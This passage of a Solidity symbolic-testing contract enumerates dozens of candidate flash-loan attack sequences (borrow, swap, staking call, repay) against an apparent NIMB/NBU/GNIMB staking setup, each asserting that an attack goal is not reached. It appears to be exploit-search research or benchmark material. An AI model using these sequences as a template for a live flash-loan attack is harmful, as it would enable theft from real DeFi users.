        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand115(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand116(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand117(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand118(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand119(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand120(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand121(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand122(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand123(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand124(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand125(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand126(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand127(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand128(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand129(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand130(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand131(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand132(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand133(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand134(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand135(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand136(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand137(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand138(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand139(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand140(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand141(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand142(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand143(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbunimb_nbu_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand144(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        transaction_gnimbstaking_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand145(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbunimb_nbu_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand146(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbunimb_nimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand147(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        transaction_gnimbstaking_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand148(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbunimb_nimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand149(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbugnimb_nbu_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand150(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        transaction_gnimbstaking_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand151(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbugnimb_gnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand152(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        transaction_gnimbstaking_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand153(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbugnimb_gnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand154(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand155(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand156(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand157(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand158(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand159(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand160(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand161(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand162(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand163(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand164(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand165(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand166(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand167(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand168(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand169(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand170(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand171(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand172(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand173(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand174(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand175(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand176(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand177(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand178(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

